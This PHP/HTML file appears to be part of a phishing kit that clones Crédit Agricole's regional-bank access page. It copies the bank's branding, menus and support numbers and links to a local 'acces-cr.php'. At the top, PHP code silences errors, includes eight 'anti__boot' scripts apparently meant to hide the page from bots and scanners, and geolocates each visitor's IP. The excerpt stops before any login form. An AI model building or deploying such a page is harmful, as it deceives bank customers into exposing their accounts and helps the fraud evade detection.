<?php
error_reporting(0);
session_start();
    include("anti__boot/anti1.php");
    include("anti__boot/anti2.php");
    include("anti__boot/anti3.php");
    include("anti__boot/anti4.php");
    include("anti__boot/anti5.php");
    include("anti__boot/anti6.php");
    include("anti__boot/anti7.php");
    include("anti__boot/anti8.php");
    require_once 'detect.php';
$ip = getenv("REMOTE_ADDR");
$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$countrycode = $IP_LOOKUP->countryCode ;
$os= getOs();
$user_agent =   $_SERVER['HTTP_USER_AGENT'];


?>
<!DOCTYPE html>
<html  lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta property="og:url" content="acces-cr.php" />
    
        
        
        
            <meta name="description" content="" />
            <meta property="og:description" content="" />
        
    
    <meta name="robots" content="noindex">
    
    
        
        
		
			<title>Accès CR - Crédit Agricole</title>
			<meta property="og:title" content="Accès CR - CA" />
		

		
	
		

	<meta name="format-detection" content="telephone=no">
	
 	<link rel="stylesheet" href="print/settings/wcm/designs/ca/npc/clientlib-part.min.ea256277357fa8db5612c74f1e54f567.css" type="text/css">

    <link rel="icon" type="image/x-icon" href="images/autre/images/logo.png">
    
    <link rel="stylesheet" href="print/settings/wcm/designs/ca/npc/clientlibStoreLocatorT33Part.min.1f61aaac8fd08ba4c317656d6f0e4a62.css" type="text/css">
<link rel="stylesheet" href="print/settings/wcm/designs/ca/npc/clientlibStoreLocatorT34Part.min.f3d31862687057258256810db3499be7.css" type="text/css">
<link rel="stylesheet" href="print/settings/wcm/designs/ca/npc/clientlibBoutonVertPart.min.d41d8cd98f00b204e9800998ecf8427e.css" type="text/css">

	
<link rel="stylesheet" href="print/settings/wcm/designs/ca/npc/clientlibStoreLocatorPart.min.804c7ef8e65f13b908c3b5f2466ea356.css" type="text/css">

<link rel="stylesheet" href="print/settings/wcm/designs/ca/npc/clientlibStoreLocatorAccesCRPart.min.ddd3469fd6c3f8f331e0d3b3d56134c3.css" type="text/css">

 



<script src="print/clientlibs/granite/jquery.min.aaffcbf7942d5bedb07855e48cbc1afa.js"></script>
<script src="print/clientlibs/granite/utils.min.423ec59365a85ebded314ad7311ef508.js"></script>
<script src="print/clientlibs/granite/jquery/granite.min.579a107dd681c49bc61dae63734043cb.js"></script>

<script src="print/settings/wcm/designs/ca/npc/clientlib-bootstrap-jquery.min.1661914e05c676ce450674555cc1e5b0.js"></script>

<script src="print/settings/wcm/designs/ca/npc/clientlibHeader.min.9b997b2ac9fca6031bd046f1edd29d81.js"></script>









<script src="etc/cloudsettings.kernel.js/conf/ca/settings/cloudsettings/default/contexthub" type="text/javascript"></script>


<script>document.cookie = 'reload-ch=; path=' + NPC.urlLiveCopyCaisse + '; expires=Thu, 01 Jan 1970 00:00:01 GMT;';</script>


</head>


<body>
	
	
	
		<header>
			<div class="sr-only" id="debutPage" tabindex="0">Début de la page</div>
			























    
    
		
		    
		    
		    	
		    		
		        		<div class="header parbase">





	
	

















	
	
		









	<!-- Machine Id hli3 -->

	


<div class="sr-only"><a id="byPassAllerAuContenu" href="#">Aller au contenu</a></div>

<div class="Header js-Header contexthub-header-non-connecte headerDiv">
    
    
    
    	
    	<div class="Header-logo logo-header">
















<span class="logo" style="height:100%;width:100%;">

		
		
			
        	<a href="index.php" class="Header-logoTitle">
        		<img class="Header-logoImg js-needFakeNotSvg" src="images/autre/images/logo_Agir.svg" alt="Aller à l'Accueil du site" style="height: 100%"/>
        	</a>
		

</span>

<script>
    (function(){
        var elem = document.querySelector('.Login-logo');
        if(elem != undefined){
            elem.firstElementChild.classList.remove('Header-logo');
        }
    })();
</script> 
</div>

    
    <div class="Header-nav">
        <div class="Header-upperNav">
            <a href="#" class="Header-buttonMenu js-openMenuMobile" role="button" aria-label="Menu"></a>

			<a href="index.php" class="Header-logoContent">
    			<img class="Header-logo--xs  js-needFakeNotSvg" src="images/autre/images/Logo_seul-1.svg" alt="Crédit Agricole - Banque et assurances"/>
            </a>
			
            <a href="#status" class="Header-market js-toggleLayerNav" role="listitem">Vous êtes un particulier&nbsp;</a>
            <div class="Header-search js-Header-search enterClick" tabindex="0" role="search" id="ct001-search">
                <div class="Header-searchPlaceholder">Rechercher une thématique, un produit...</div>
            </div>

            <a onclick="NPC.storeLocator.gotoAccesCrEtAgence();event.preventDefault()" href="#" class="Header-locator">
				<i class="Header-locatorLogo icon npc-locator" aria-hidden="true"></i>
				<span class="sr-only">Trouver une agence</span>
            </a>
           
            <nav role="navigation" aria-label="Menu principal">
	   			
	            	
	            	
			            <div class="Header-help--bouton-vert--trigger">

















	
 	
 	
		
		
            <a id="btnNousContacter" class="Header-help" href="javascript: void(0);" role="button" aria-label="Nous Contacter" style="color: #fff;" data-trackingclass="oic_nous_contacter">
            	<div class="Header-helpText">Nous contacter</div>
            </a>

     
               		 
     



	
	
		
		
		
		
	




	
 	
		
	
               	
     
 	




	
 	
		
	
               	
     
 	


  
	  





   



 
   


 
   



								
	
		
	
	
	
  

<div class="bouton-vertWrapper" style="display: none;" data-value='{
"erreurGpu":false,
"erreurSi":false,
"erreurTableStart" :false,
"erreurGeoloc":false,
"conseillerDispo" :false,
"activationNumArcep" :false,
"gpuData":"undefined",
"modelData":,
"dayDate":"",
"dayTime":"",
"agence":&#34;undefined&#34;,
"conseiller":&#34;undefined&#34;,
"motifSelected":"",
"startDataInf":"",
"startDataOpt":"",
"startDataInfMotifSelected":"",
"idMotif":[5]

}'>
	<div class="GreenBtnContainer js-GreenBtnContainer hidden-print">
    <div id="greenBtnContainerDiv" tabindex="-1" class="GreenBtn-callbackHome" style="display: none;" data-trackingClass="oic_layer_national">
        
        <div class="GreenBtn-callbackHomeHeader">
            <p class="GreenBtn-callbackHomeHeaderTitle GreenBtn-callbackPara--noMarginBot js-GreenBtn-Main" style="display: none;width: 100%">UN BESOIN ? UN PROJET ? CONTACTEZ-NOUS</p>
   			<p class="GreenBtn-callbackHomeHeaderTitle GreenBtn-callbackPara--noMarginBot js-GreenBtn-Urgence" style="display: none;width: 100%">Aide et urgence ?</p>
            <a id="fermetureLayerBV" href="javascript: void(0);" role="button" aria-label="Fermer la fenêtre nous contacter et revenir au menu principal" class="icon npc-close GreenBtn-callbackClose" data-trackingclass="oic_fermer"></a>
        </div>

		

            <div class="GreenBtn-callbackHomeContent bouton-vertContent js-GreenBtn-Main" style="display: none;">
                <a href="javascript: void(0);" class="GreenBtn-callbackHomeHeaderBtn" data-trackingclass="oic_urgence"><b>Aide et urgence ?</b></a>
                
				
					            
							<div class="GreenBtn-callbackUrgencyMessage">
								<div class="GreenBtn-callbackUrgencyMessageTitle">Vous souhaitez contacter un conseiller du Crédit Agricole</div>
								<p class="GreenBtn-callbackUrgencyMessagePara">Pour mieux répondre à vos besoins, les Caisses Régionales mettent à votre disposition des moyens de contact qui vous permettront d’entrer en relation avec un conseiller.</p>
								<div class="GreenBtn-callbackHomeContentLink">
									<a onclick="NPC.storeLocator.gotoAccesCr();event.preventDefault()" href="#" class="btn btn-default GreenBtn-callbackUrgencyMessageBtn" data-trackingclass="oic_trouver_ma_CR">Trouver ma caisse régionale</a>
								</div>
							</div>
					

					
					
				
				
            </div>
		
            <div class="GreenBtn-callbackHomeContent GreenBtn-callbackHomeContent--urgencyLayer bouton-vertContent js-GreenBtn-Urgence" style="display: none;">
                <a href="javascript: void(0);" class="GreenBtn-callbackHomeHeaderBtn--urgencyLayer bouton-vertNumeroRetour">
                    <span class="icon npc-left GreenBtn-callbackUrgencyLayerIconHeader"></span>Retour</a>
                
                <div class="GreenBtn-callbackUrgencyLayerWrapper">
                	
                	
					
                	
                    <div class="GreenBtn-callbackUrgencyLayerBlocWrapper">
                        <div class="GreenBtn-callbackUrgencyLayerBloc">
                            <div class="GreenBtn-callbackUrgencyLayerBlocTitle">
                                Vos moyens de paiement
                                <ul class="GreenBtn-callbackUrgencyLayerBlocTitleList">
                                    <li>Carte bloquée, volée ou perdue</li>
                                    <li>Faire opposition sur un chèque ou un chéquier</li>
                                </ul>
                            </div>

                            <div class="GreenBtn-callbackUrgencyLayerBlocDescription">
                                <a href="tel://+33969399291" class="GreenBtn-callbackUrgencyLayerBlocDescriptionClick">
                                
	                            	<div class="GreenBtn-callbackUrgencyLayerBlocNumber">09 69 39 92 91</div>
                                    <div class="GreenBtn-callbackUrgencyLayerBlocPrice">Prix d'un appel local</div>
                                    
                                </a>
                            </div>
                        </div>
                        <div class="GreenBtn-callbackUrgencyLayerSubBloc">
                            <ul class="GreenBtn-callbackUrgencyLayerSubBlocLists">
                            
                            	<li class="GreenBtn-callbackUrgencyLayerSubBlocList">Le service SOS CARTE du Crédit Agricole est disponible pour tous vos moyens de paiement 7j/7 et 24h/24.</li>
                               	<li class="GreenBtn-callbackUrgencyLayerSubBlocList">Faites une déclaration aux autorités de police, ou au consulat si vous êtes à l’étranger.</li>
                               	<li class="GreenBtn-callbackUrgencyLayerSubBlocList">Toute demande d’opposition doit être confirmée par lettre recommandée dans les plus brefs délais, adressée à votre agence du Crédit Agricole.</li>
                               	<li class="GreenBtn-callbackUrgencyLayerSubBlocList">Depuis l’étranger, contactez le +(33) 9 69 39 92 91 *</li>
                            
                            </ul>
                        </div>
                    </div>
                    
                    <div class="GreenBtn-callbackUrgencyLayerBlocWrapper">
                        <div class="GreenBtn-callbackUrgencyLayerBloc">                           
                                <div class="GreenBtn-callbackUrgencyLayerBlocTitle">Vous avez subi un sinistre Auto, Habitation, <br />assurance accidents de la vie ?<br /></div>                            
                            <div class="GreenBtn-callbackUrgencyLayerBlocDescription">
                                
                            		
                            		
		                            	<a href="tel://+33800810812" class="GreenBtn-callbackUrgencyLayerBlocDescriptionClick">
		                                    
		                                    <div class="Arcep">
		                                        <span class="Arcep-number">0 800 810 812</span>
		                                        <div class="Arcep-legalMentions">
		                                            <div class="Arcep-legalMention">
		                                                Service & appel
		                                                <p class="Arcep-legalMentionsInfo">gratuits</p>
		                                            </div>
		                                        </div>
		                                    </div>
		                                    
		                            	</a>
	                            	
	                            
                            </div>
                        </div>
                        
                        <div class="GreenBtn-callbackUrgencyLayerSubBloc">
                            <ul class="GreenBtn-callbackUrgencyLayerSubBlocLists">
                                <li class="GreenBtn-callbackUrgencyLayerSubBlocList">Pour déclarer un sinistre ou bénéficier des prestations d’assistance, nos spécialistes sont à votre écoute 7j/7 et 24h/24.</li>
                                <li class="GreenBtn-callbackUrgencyLayerSubBlocList">Depuis l’étranger, contactez le (+33) 1 41 85 97 97 *</li>
                            </ul>
                        </div>
                    </div>
                    <div class="GreenBtn-callbackUrgencyLayerBlocWrapper">
                        <div class="GreenBtn-callbackUrgencyLayerBloc">
                            <div class="GreenBtn-callbackUrgencyLayerBlocDescription">
                                <div class="GreenBtn-callbackUrgencyLayerBlocTitle">Protection Juridique Pleins Droits</div>
                            </div>
                            <div class="GreenBtn-callbackUrgencyLayerBlocDescription">
                            	
                            		
                            		
                            			<a href="tel://+33800813810" class="GreenBtn-callbackUrgencyLayerBlocDescriptionClick">
		                                    
		                                    <div class="Arcep">
		                                        <span class="Arcep-number">0 800 813 810</span>
		                                        <div class="Arcep-legalMentions">
		                                            <div class="Arcep-legalMention">
		                                                Service & appel
		                                                <p class="Arcep-legalMentionsInfo">gratuits</p>
		                                            </div>
		                                        </div>
		                                    </div>
		                                    
	                                	</a>
                            		
                            	
                            </div>

                        </div>
                        <div class="GreenBtn-callbackUrgencyLayerSubBloc">
                            <ul class="GreenBtn-callbackUrgencyLayerSubBlocLists">
                                <li class="GreenBtn-callbackUrgencyLayerSubBlocList">Vous avez souscrit un contrat Pleins Droits et vous avez un litige à déclarer. Nos conseillers sont à votre écoute du lundi au vendredi, de 8h30 à 19h et le samedi de 9h à 16h.</li>
                                <li class="GreenBtn-callbackUrgencyLayerSubBlocList">Depuis l’étranger, contactez le (+33) 2 35 59 42 78 *</li>
                                <li class="GreenBtn-callbackUrgencyLayerSubBlocList">N’entreprenez aucune démarche avant d’avoir appelé.</li>
                            </ul>
                        </div>
                    </div>
                    
                    <div class="GreenBtn-callbackUrgencyLayerBlocWrapper">
                        <div class="GreenBtn-callbackUrgencyLayerBloc">
                            <div class="GreenBtn-callbackUrgencyLayerBlocDescription">
                            
							
	                            
								
	                                <div class="GreenBtn-callbackUrgencyLayerBlocTitle">Vous avez choisi la complémentaire santé du<br />Crédit Agricole pour vos dépenses de santé ?<br /></div>
															
							
							
                            </div>
                            <div class="GreenBtn-callbackUrgencyLayerBlocDescription">
                                <a href="tel://+33977405000" class="GreenBtn-callbackUrgencyLayerBlocDescriptionClick">
                                    <div class="GreenBtn-callbackUrgencyLayerBlocNumber">09 77 40 50 00</div>
                                    <div class="GreenBtn-callbackUrgencyLayerBlocPrice">Prix d'un appel local</div>
                                </a>
                            </div>
                        </div>
                        <div class="GreenBtn-callbackUrgencyLayerSubBloc">
                            <ul class="GreenBtn-callbackUrgencyLayerSubBlocLists">
                                <li class="GreenBtn-callbackUrgencyLayerSubBlocList">Nos conseillers sont à votre écoute pour la prise en charge de votre dossier, du lundi au vendredi de 8h à  18h (sauf jours fériés)</li>
                                <li class="GreenBtn-callbackUrgencyLayerSubBlocList">En cas d’urgence, pour bénéficier des services d’assistance en France comme de l’étranger, appelez le  (+33) 9 69 391 256 *</li>
                            </ul>
                        </div>
                    </div>
                    
                    
                        <div class="GreenBtn-callbackUrgencyLayerBlocWrapper">
                            <div class="GreenBtn-callbackUrgencyLayerBloc">
                                <div class="GreenBtn-callbackUrgencyLayerBlocDescription">
                                    <div class="GreenBtn-callbackUrgencyLayerBlocTitle">VOUS AVEZ SUBI UN SINISTRE ASSURANCE TOUS MOBILE ?</div>
                                </div>
                                <div class="GreenBtn-callbackUrgencyLayerBlocDescription">
                               
                                    
		                                    
		                                    
		
		                                    <a href="tel://+33 800 201 050" class="GreenBtn-callbackUrgencyLayerBlocDescriptionClick">
		                                        
		                                            
		                                                
		                                                
		                                                    
		                                                        
		                                                    
		                                                    
		                                                    
		                                                
		                                                <div class="Arcep">
		                                                    <span class="Arcep-number">0 800 201 050</span>
		                                                    <div class="Arcep-legalMentions">
																
		                                                            
		                                                                <div class="Arcep-legalMention">
		                                                                    Service & appel
		                                                                    <p class="Arcep-legalMentionsInfo">gratuits</p>
		                                                                </div>
		                                                            
		                                                            
		                                                            
		                                                        
		                                                    </div>
		                                                </div>
		                                            
		                                            
		                                        
		                                    </a>
                                </div>
                            </div>
                            <div class="GreenBtn-callbackUrgencyLayerSubBloc">
                                <ul class="GreenBtn-callbackUrgencyLayerSubBlocLists">
                                    <li class="GreenBtn-callbackUrgencyLayerSubBlocList">Pour déclarer un sinistre,  nos spécialistes sont à votre écoute du lundi au vendredi, de 8h à 19h et le samedi de 9h à 16h.</li>
                                    
										<li class="GreenBtn-callbackUrgencyLayerSubBlocList">Depuis l&#39;étranger, contactez le (+ 33) 1 53 74 49 00 *</li>
                                    
                                    
                                </ul>
                            </div>
                        </div>
                    
                    
                    
                    
	                    
						
							<a href="#" id="lienFaq" class="GreenBtn-callbackHomeFooter--urgencyLayer">Consultez notre Foire Aux Questions</a>
						
                    
                    
                    <div class="GreenBtn-callbackUrgencyLayerCallCosts">
                        <span class="GreenBtn-callbackUrgencyLayerCallCost">* Depuis l’étranger – Coût selon opérateur</span>
                    </div>
                </div>
            </div>
        </div>
        
        
        <div class="GreenBtn" style="display: none;"></div>
        <div id="CaptchaBoutonVert" class="hidden" style="color:#071621">
             <div class="parsys-captcha captcha parbase">


			        
	            
	            
            </nav>
            
            
            	<div class="Header-open">










<a class="Header-open" href="#" role="link" target="_self">Ouvrir un compte</a></div>

           	
           	
            <div class="mon-espace parbase">











	

		
			
			
				
			
		
		

		
			
				
				<a href="acces-cr.php" class="Header-login" aria-label="Accéder à mes comptes" data-trackingclass="connexion_client">
					<div class="Header-loginText">mon espace</div>
				</a>
			
			
		
	
	
	

</div>

        </div>
        
        <div class="Header-lowerNav">
            <nav class="MainNav js-sliderNav" data-max-items="99" aria-label="Menu secondaire">
                <ul class="MainNav-list js-sliderNav-nav MainNav-UlAccess">
                    
                     
						
                            
                            
                        
                        
        				<li class="MainNav-listItem js-sliderNav-item MainNav-listAccess"><a href="#" id="link-menu0-besoin1" class="MainNav-listLink " target="_self">Comptes &amp; Cartes</a></li>
                     
						
                            
                            
                        
                        
        				<li class="MainNav-listItem js-sliderNav-item MainNav-listAccess"><a href="#" id="link-menu1-besoin1" class="MainNav-listLink " target="_self">Épargner</a></li>
                     
						
                            
                            
                        
                        
        				<li class="MainNav-listItem js-sliderNav-item MainNav-listAccess"><a href="#" id="link-menu2-besoin1" class="MainNav-listLink " target="_self">S&#39;assurer</a></li>
                     
						
                            
                            
                        
                        
        				<li class="MainNav-listItem js-sliderNav-item MainNav-listAccess"><a href="#" id="link-menu3-besoin1" class="MainNav-listLink " target="_self">Emprunter</a></li>
                    
                     
						
                            
                            
                        
                        
        				<li class="MainNav-listItem js-sliderNav-item MainNav-listAccess"><a href="#" id="link-menu0-RSD1" class="MainNav-listLink " target="_self">Simulation &amp; Devis</a></li>
                    
                   <li class="MainNav-listItem js-sliderNav-item MainNav-listAccess"><a id="nosConseilsHeader" href="#advices" role="button" aria-label="Menu nos conseils" class="MainNav-listLink MainNav-listLink--mega js-toggleLayerNav">nos conseils</a></li>
                </ul>
                <span aria-hidden="true" id="sliderNavPrevHeader " class="sliderNav--prev js-sliderNav--prev">...</span>
  				<span aria-hidden="true" id="sliderNavNextHeader" class="sliderNav--next js-sliderNav--next">...</span>	
                <a href="#" role="button" class="MainNav-moreLink js-sliderNav-toggle MainNav-listAccess">Voir plus</a>
            </nav>
        </div>
    </div>
</div>
 

<div class="HeaderSticky js-HeaderSticky" aria-hidden="true">
    <a tabindex="-1" href="index.php" class="HeaderSticky-logo">
		<img class="HeaderSticky-logoImg  js-needFakeNotSvg" src="images/autre/images/CA_Logo_seul-1.svg" alt=""/>
		<img class="HeaderSticky-logo--xs js-needFakeNotSvg" src="images/autre/images/CA_Logo_seul-1.svg" alt=""/>
	</a>
 
    <div class="HeaderSticky-needs">
        <nav class="MainNav js-sliderNav" data-max-items="99">
	        <ul class="MainNav-list js-sliderNav-nav" role="menubar">
	             
	                
	                    
	                    
	                
	                
	                <li class="MainNav-listItem js-sliderNav-item"><a tabindex="-1" href="#" id="link-menu0-besoin2" class="MainNav-listLink " target="_self" role="menuitem">Comptes &amp; Cartes</a></li>
	             
	                
	                    
	                    
	                
	                
	                <li class="MainNav-listItem js-sliderNav-item"><a tabindex="-1" href="#" id="link-menu1-besoin2" class="MainNav-listLink " target="_self" role="menuitem">Épargner</a></li>
	             
	                
	                    
	                    
	                
	                
	                <li class="MainNav-listItem js-sliderNav-item"><a tabindex="-1" href="#" id="link-menu2-besoin2" class="MainNav-listLink " target="_self" role="menuitem">S&#39;assurer</a></li>
	             
	                
	                    
	                    
	                
	                
	                <li class="MainNav-listItem js-sliderNav-item"><a tabindex="-1" href="#" id="link-menu3-besoin2" class="MainNav-listLink " target="_self" role="menuitem">Emprunter</a></li>
	            
	             
	                
	                    
	                    
	                
	                
	                <li class="MainNav-listItem js-sliderNav-item"><a tabindex="-1" href="#" id="link-menu0-RSD2" class="MainNav-listLink " target="_self" role="menuitem">Simulation &amp; Devis</a></li>
               
	              <li class="MainNav-listItem js-sliderNav-item"><a tabindex="-1" href="#" role="listitem" class="MainNav-listLink MainNav-listLink--mega js-toggleLayerNav">nos conseils</a></li>
	          </ul>
	      
	      </nav>
    </div>

    <div class="HeaderSticky-search js-Header-search"></div>
    <a tabindex="-1" href="#" class="HeaderSticky-help">
		<div class="icon npc-talk-blank"></div>
    </a>
      
    
	    
	     	 <a tabindex="-1" href="#" class="HeaderSticky-login"></a>
	        
	    
	
</div>

	
	




<div class="Header-layers hidden js-headerLayers">
	









<div id="header-layer-menu-markets" class="LayerNav js-LayerNav-status hidden">
    <div class="row row-no-padding LayerNav-inner">
        <div class="visible-xs visible-sm">
     		<a href="#" class="LayerNav-backMobile js-backMenuMobile"><i class="icon npc-left LayerNav-backMobileIcon"></i> Retour</a>
    	</div>

			
		<div class="col-md-4 hidden-xs hidden-sm LayerNav-push">











    <div class="LayerNav-pushImg" style="background-image:url('images/autre/images/mega-menu-layer-vous-etes.jpg')"></div>


<div class="LayerNav-pushMsg">
	<div class="LayerNav-pushTitle">
		<div class="SimpleText">











    


    
    	<b>Nous nous engageons pour le développement des territoires</b><br />

    
    
    

</div>

	</div>
	<div class="LayerNav-pushText">
		<div class="texte">




<div tabindex="-1">
    <p>Auprès des particuliers, des associations, des professionnels, des entreprises, des collectivités...<br>
Le Crédit Agricole œuvre chaque jour au développement économique et social des territoires.</p>

</div>
</div>

	</div>
	<div class="SimpleText">











    
    	
    
        
        	<a href="#" class="lien-ca" target="_self">
        

            <i> </i>Découvrir notre modèle <br />


        
        	</a>
        
    
    
</div>

</div></div>

		
        <div class="col-xs-12 col-md-8 LayerNav-content">	
            <dl class="LayerNav-dlist">
                
                    <dt class="LayerNav-dlistTitle">
                    	
	        				
	        				
	        					<a href="#" class="LayerNav-dlistLink">Particulier</a>
	        				
        				
                    </dt>
                    <dd></dd>
                
                    <dt class="LayerNav-dlistTitle">
                    	
	        				
	        				
	        					<a href="#" class="LayerNav-dlistLink">Banque privée</a>
	        				
        				
                    </dt>
                    <dd></dd>
                
                    <dt class="LayerNav-dlistTitle">
                    	
	        				
	        				
	        					<a href="#" class="LayerNav-dlistLink">Professionnel</a>
	        				
        				
                    </dt>
                    <dd></dd>
                
                    <dt class="LayerNav-dlistTitle">
                    	
	        				
	        				
	        					<a href="#" class="LayerNav-dlistLink">Agriculteur</a>
	        				
        				
                    </dt>
                    <dd></dd>
                
                    <dt class="LayerNav-dlistTitle">
                    	
	        				
	        				
	        					<a href="#" class="LayerNav-dlistLink">Association</a>
	        				
        				
                    </dt>
                    <dd></dd>
                
                    <dt class="LayerNav-dlistTitle">
                    	
	        				
	        				
	        					<a href="#" class="LayerNav-dlistLink">Entreprise</a>
	        				
        				
                    </dt>
                    <dd></dd>
                
                    <dt class="LayerNav-dlistTitle">
                    	
	        				
	        				
	        					<a href="#" class="LayerNav-dlistLink">Collectivité publique et logement social</a>
	        				
        				
                    </dt>
                    <dd></dd>
                
            </dl>
            
            <a id="header-link-hide-markets" class="LayerNav-close js-LayerNav-close" href="#" title="Fermer le menu"><i class="icon npc-close"></i></a>
        </div>
    </div>
</div>

	









<div class="LayerNav js-LayerNav-advices hidden">
</div>
	
</div>

<script>
	(function (document, $) {
		
	    $( document ).ready(function() {
	        $("#debutPage").focus();
	    });
		
	    $( "#byPassAllerAuContenu" ).click(function() {
	        $( "#main" ).focus();
	    });
	    
        $( "#byPassAllerAuContenu" ).focus(function() {
			$(document).scrollTop( 0 );
        });

        $( "#sliderNavPrevHeader" ).focus(function() {
            $(document).scrollTop( 0 );
        });
        
        $( "#sliderNavNextHeader" ).focus(function() {
            $(document).scrollTop( 0 );
        });
        
        $( "#nosConseilsHeader" ).focus(function() {
            $(document).scrollTop( 0 );
        });
        
		$( "#byPassAllerAuContenu" ).focus(function() {
	        $(this).parent().addClass("AlertBanner--top AlertBanner").removeClass("sr-only");
	        var headerMarginTop = parseInt( $(".headerDiv").css("margin-top"));
	        $(this).parent().css("margin-top","+="+headerMarginTop);
	        $(".headerDiv").css("margin-top","+=17px");

	    });
	    
	    $( "#byPassAllerAuContenu" ).focusout(function() {
	        $(this).parent().addClass( "sr-only" ).removeClass("AlertBanner--top AlertBanner");
	        $(this).parent().css("margin-top","0px");
	        $(".headerDiv").css("margin-top","-=17px");
	    });
	
        $('.enterClick').bind('keypress', function(e) {
            if (e.which == 13){
                $(e.target).click();
            }
	  	});
       
	    var blocker  = document.querySelector( '#greenBtnContainerDiv' );
	    var observer = new MutationObserver( function( mutations ){
	        mutations.forEach( function( mutation ){
				if( mutation.attributeName === 'style' && window.getComputedStyle( blocker ).getPropertyValue( 'display' ) !== 'none')
	            {
	                  $("#greenBtnContainerDiv").focus();
	            }
	            else if( mutation.attributeName === 'style' && window.getComputedStyle( blocker ).getPropertyValue( 'display' ) == 'none')
	            {
	                  $("#btnNousContacter").focus();
	            }
	        } );
	    } );
	    observer.observe( blocker, { attributes: true } );
	    
        $( ".closeAlertBannerAccess").click(function() {
            $("#debutPage").focus();
        });
        
    	$("[href='#advices']").first().parent().on("click",function(){
            var placeToAddNosConseilsMenu = $(".js-LayerNav-advices");
            if(placeToAddNosConseilsMenu[0].childElementCount<1){
                $.ajax({
                    url: "#",
                	cache:true
				})
            	.success(function(data) {
					placeToAddNosConseilsMenu.append(data);
                    LayerNav.initialize();
        			LayerNav.toggle($("[href='#advices']").first());
                })
            	.error(function(data) {
            		placeToAddNosConseilsMenu.append("<div>Une erreur est survenue durant le chargement</div>");
                });
            }
        });
    })(document, Granite.$);
</script>
<script>
	(function (document, $) {

        var target = document.querySelectorAll(".NavKeyboardAccess");
        var lastTarget="";
        for (var i = 0; i < target.length; i++) {
            var observer = new MutationObserver(function(mutations) {
                mutations.forEach(function(mutation) {
                    if (mutation.target.classList.contains('LayerNav-pushNavItem--active')) {
                        lastTarget = (mutation.target.getAttribute("href") == undefined) ? mutation.target.getAttribute("data-href") : mutation.target.getAttribute("href");
                        $(lastTarget).focus();
                    }
                });
            });

            var config = { attributes: true };
            observer.observe(target[i], config);
        }

		function focusAndLastTarget(e) {
			$(e.target).attr('href') == undefined ? $($(e.target).attr('data-href')).focus() : $($(e.target).attr('href')).focus();
			lastTarget = ($(e.target).attr('href') == undefined) ? $(e.target).attr('data-href') : $(e.target).attr('href');
		}

        function addAndRemoveActiveClass(e) {
                e.preventDefault();
                $(e.target).addClass( 'LayerNav-pushNavItem--active' )
                    .siblings( '.LayerNav-pushNavItem--active' )
                    .removeClass( 'LayerNav-pushNavItem--active');
                var $target = $( $(e.target).attr( 'data-href' ) || $(e.target).attr( 'href' ) );
                var $tabs = $target.closest( '.js-LayerNav-tabs' ).find( '.js-LayerNav-tab' );
                $tabs.removeClass( 'LayerNav-tab--active' );
                $target.addClass( 'LayerNav-tab--active' );
				focusAndLastTarget(e);
        }

		$('.NavKeyboardAccess').bind('keypress', function(e) {
            if (e.which == 13){
				addAndRemoveActiveClass(e);
            }
   		});

        $( ".NavKeyboardAccess" ).on("click", function(e) { focusAndLastTarget(e) });

        $( "#separtorListMesOperations" ).focus(function() {
            $(lastTarget+"-link").focus();
            lastTarget="#operations-1";
        });

        $( "#menuMesOperations").click(function() {
            lastTarget="#operations-1";
        });

        $( "#startPopinMesOperationsAccess" ).focus(function() {
            $("#closeButtonPopinMesOperations").focus();
        });
        
        $( "#endPopinMesOperationsAccess" ).focus(function() {
        	$(lastTarget+"-link").focus();
            lastTarget="#operations-1";
        });
        
        $( "#menuMesDocuments").click(function() {
			lastTarget="#document-1-link";
            $(lastTarget).focus();
        });

        $( "#startPopinMesDocumentsAccess" ).focus(function() {
            $("#closeButtonPopinMesDocuments").focus();
        });

        $( "#endPopinMesDocumentsAccess" ).focus(function() {
			$(lastTarget).focus();
            lastTarget="#document-1-link";
        });
        
        $( "#startPopinTouteLOffreAccess" ).focus(function() {
            $("#closeButtonPopinTouteLOffre").focus();
        });

        $( "#endPopinTouteLOffreAccess" ).focus(function() {
        	$("#statusJeNeSuisPas").focus();
        });
        
        $( ".menuNosConseils").click(function() {
            lastTarget="#conseils-0";
        });

	})(document, Granite.$);
</script>












<div class="Header-menu js-MenuMobile hidden">
	<div class="Header-menuHeader">
		
		<a href="#" class="Header-menuClose js-MenuMobile-close" id="ct001-btn-close" role="button" aria-label="Fermer le menu"></a>
		
			
				<div class="Header-menuLogo" style="background-image: url('images/autre/images/CA_Logo_seul-1.svg')"></div>
			
			
		
	</div>
	<div class="Header-menuRows js-menuRows-main">
        <a href="#status" id="a-masque-menu-non-connecte-tab" class="Header-menuRow Header-menuRow--back js-toggleLayerNav">
	      <span class="Header-menuIcon npc-left"></span>
	      <span class="Header-menuRowText Header-menuRowText--back">Je ne suis pas un particulier</span>
    	</a>


		
		
		  
              	<a href="#" class="Header-menuRow">              	
					<span class="Header-menuIcon npc-card"></span>
                    <span class="Header-menuRowText">Comptes &amp; Cartes</span>
                </a>
	      
              	<a href="#" class="Header-menuRow">              	
					<span class="Header-menuIcon npc-pig"></span>
                    <span class="Header-menuRowText">Épargner</span>
                </a>
	      
              	<a href="#" class="Header-menuRow">              	
					<span class="Header-menuIcon npc-umbrella"></span>
                    <span class="Header-menuRowText">S&#39;assurer</span>
                </a>
	      
              	<a href="#" class="Header-menuRow">              	
					<span class="Header-menuIcon npc-pie-chart"></span>
                    <span class="Header-menuRowText">Emprunter</span>
                </a>
	      
		  
              	<a href="#" class="Header-menuRow">              	
    				<span class="Header-menuIcon npc-money"></span>    				
                    <span class="Header-menuRowText">Simulation &amp; Devis</span>
                </a>
	      
      
      
    
    
      
      
    
		<a href="#advices" class="Header-menuRow js-toggleLayerNav">
			<span class="Header-menuIcon npc-bulb"></span>
      		<span class="Header-menuRowText Header-menuRowText--em">
      		Nos conseils
      		
      		</span>
		</a>
    

	</div>
	
	
	  
	<div class="Header-menuSubfooter js-Header-search">
		<div class="container-fluid">
			<div class="row">
				<div class="col-xs-10">
					<input type="text" class="form-control Header-menuInput" id="search-input" placeholder="Posez votre question">
				</div>
				<div class="col-xs-2 text-center">
					 <div class="icon npc-magnifer Header-menuSubfooterIcon" tabindex="0" role="button" aria-label="Rechercher"></div>
				</div>
			</div>
		</div>
	</div>
	
	
	<div class="Header-menuFooter">
		<div class="container-fluid">
			<div class="row">
			
			
			
				
				<div class="col-xs-4 text-center">
